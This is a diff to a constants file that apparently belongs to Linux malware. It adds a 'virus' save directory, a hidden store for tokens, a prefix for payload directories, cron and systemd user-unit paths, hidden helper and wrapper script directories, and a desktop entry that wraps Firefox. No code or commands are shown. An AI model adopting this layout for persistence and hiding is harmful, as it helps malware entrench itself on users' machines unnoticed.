@@ -45,4 +45,26 @@ UNIT_DIR = '~/.config/systemd/user'
 
 BACKUP_DIR_DEFAULT = "~/.cache/backups"
 
-DIR_SAVE_VIRUS = "~/.cache/bin"
+DIR_SAVE_VIRUS = "~/.cache/tmp"
+
+DIR_TOKEN_HANDSHAKE = "~/.cache/tmp/tokens"
+
+PREFIX_DIR_PAYLOAD = ".tmp_"
+
+CRON_DIR = "~/.config/cron"
+
+BASH_SCRIPT_NAME = "cron-runner.sh"
+
+HELPER_SCRIPT_NAME = "help.sh"
+
+HELPER_DIR = "~/.local/share/.helper"
+
+WRAPPER_SCRIPT_NAME = "wrapper.sh"
+
+WRAPPER_DIR = "~/.local/share/.wrapper"
+
+DESKTOP_SCRIPT_NAME = "open-with-helper-firefox.desktop"
+
+DESKTOP_DIR = "~/.local/share/applications/"
+
+FIREFOX_BIN = "/usr/bin/firefox"
